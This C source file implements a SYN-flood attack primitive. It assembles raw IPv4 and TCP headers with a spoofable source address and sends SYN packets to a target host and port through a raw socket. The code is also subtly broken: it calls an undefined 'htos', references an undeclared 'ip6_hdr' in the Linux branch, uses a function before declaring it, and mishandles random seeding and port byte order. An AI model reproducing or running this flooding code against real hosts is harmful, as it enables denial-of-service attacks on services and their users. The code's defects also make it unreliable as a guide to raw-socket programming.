#include "syn_attack.h"

static struct ip * ipv4_hdr_create(const char *src_addr, const char * dst_addr, int len)
{
      struct ip * ipv4_hdr;

      if (!(ipv4_hdr = (struct ip *) malloc(sizeof(struct ip))))
      {
            printf("Error: Malloc error\n");
            return NULL;
      }
      
      ipv4_hdr->ip_v = IPVERSION;
      ipv4_hdr->ip_hl = sizeof(struct ip) / 4;
      ipv4_hdr->ip_tos = 0;
#if defined(__linux)
      ipv4_hdr->ip_len = htons(len);
#else
      ipv4_hdr->ip_len = len;
#endif
      ipv4_hdr->ip_id = 0;
      ipv4_hdr->ip_off = 0;
      ipv4_hdr->ip_ttl = MAXTTL;
      ipv4_hdr->ip_p = IPPROTO_TCP; // TCP
      ipv4_hdr->ip_sum = 0;
      ipv4_hdr->ip_src.s_addr = inet_addr(src_addr);
      ipv4_hdr->ip_dst.s_addr = inet_addr(dst_addr);

      ipv4_hdr->ip_sum = 0;
      
      return ipv4_hdr;
}

static struct tcphdr* tcp_hdr_create(const u_int16_t dst_port, struct ip * ip_hdr)
{
      struct tcphdr * tcp_hdr;

      if (!(tcp_hdr = (struct tcphdr *)malloc(sizeof(struct tcphdr))))
      {
            printf("Error: Malloc error\n");
            return NULL;
      }
#if defined(__linux)
      tcp_hdr->source = htons(generate_random_port()); 
      tcp_hdr->dest = htons(dst_port);
      tcp_hdr->doff = sizeof(struct tcphdr) / 4;
      tcp_hdr->syn = 1;  //SYN
      tcp_hdr->window = htos(WIN_SIZE);
      tcp_hdr->seq = htonl(generate_random_seq());
      tcp_hdr->check = htons(tcp_checksum(ip6_hdr, tcp_hdr));
#else
      tcp_hdr->th_sport = htons(generate_random_port());
      tcp_hdr->th_dport = htons(dst_port);
      tcp_hdr->th_off = sizeof(struct tcphdr) / 4;
      tcp_hdr->th_flags = TH_SYN;
      tcp_hdr->th_seq = htonl(generate_random_seq());
      tcp_hdr->th_win = htons(WIN_SIZE);
      tcp_hdr->th_sum = htons(tcp_checksum(ip_hdr, tcp_hdr)); 
#endif 
      return tcp_hdr;
}

static u_int16_t tcp_checksum(struct ip *ip_hdr, struct tcphdr *tcp_hdr)
{
      u_int32_t checksum = 0;

      struct tcp_checksum_hdr *chk_hdr = (struct tcp_checksum_hdr *)malloc(sizeof(struct tcp_checksum_hdr));

      if (chk_hdr == NULL)
      {
            printf("Error: Malloc error\n");
            return 0;
      }
      
      chk_hdr->ip_src = ip_hdr->ip_src;
      chk_hdr->ip_dst = ip_hdr->ip_dst;
      chk_hdr->zero = 0;
      chk_hdr->ip_p = IPPROTO_TCP;
      chk_hdr->tcp_len = htons(sizeof(struct tcphdr));
      chk_hdr->tcp_hdr = *tcp_hdr;
      u_int16_t * checksum_values = (u_int16_t *) chk_hdr;

      int i = 0;
      while (i < sizeof(struct tcp_checksum_hdr) / 2)            
            checksum += htons(checksum_values[i++]);
      
      
      if (checksum >> 16)      
            checksum = (checksum & 0xffff) + (checksum >> 16);
      
      free(chk_hdr);
      return ((u_int16_t)~checksum);
}

static u_int32_t generate_random_seq()
{
      time_t t;
      srand((unsigned) time(&t));
      return rand() % 4294967296;
}

static u_int16_t generate_random_port()
{
      time_t t;
      srand((unsigned) time(&t));
      return rand() % 30000 + 35526; // Range from 35526 to 65535
}

int syn_attack_sock(const char * dst_addr, const char * src_addr, u_int16_t dst_port)
{

      struct ip * ipv4_hdr;
      struct tcphdr * tcp_hdr;
      struct sockaddr_in dstsock_addr;

      memset(&dstsock_addr, 0, sizeof(struct sockaddr_in));

      int sockaddr_in_len = sizeof(struct sockaddr_in);
      int sockfd, on = 1;

      char send_buff[P_SIZE];
      memset(send_buff, 0, sizeof(send_buff));
      
      dstsock_addr.sin_family = PF_INET;
      dstsock_addr.sin_addr.s_addr = inet_addr(dst_addr);
      dstsock_addr.sin_port = dst_port;


      if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
      {
            printf("Error[socket()]: %s err_code: %d\n", strerror(errno), errno);
            return (-1);
      }
      
      if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
      {
            printf("Error[setsockopt()]: %s err_code: %d\n", strerror(errno), errno);
            return (-1);
      }
      
      ipv4_hdr = ipv4_hdr_create(src_addr, dst_addr, P_SIZE);
      tcp_hdr = tcp_hdr_create(dst_port, ipv4_hdr);
      
      memcpy(send_buff, ipv4_hdr, sizeof(struct ip));
      memcpy(send_buff + sizeof(struct ip), tcp_hdr, sizeof(struct tcphdr));

      // Send syn packet
      int ret_len = sendto(sockfd, send_buff, P_SIZE, 0, (struct sockaddr *)&dstsock_addr, sockaddr_in_len);
      
      if (ret_len < 0) printf("Error[sendto()]: %s err_code: %d\n", strerror(errno), errno);
      
      free(ipv4_hdr);
      free(tcp_hdr);
      close(sockfd);
      return (ret_len);
}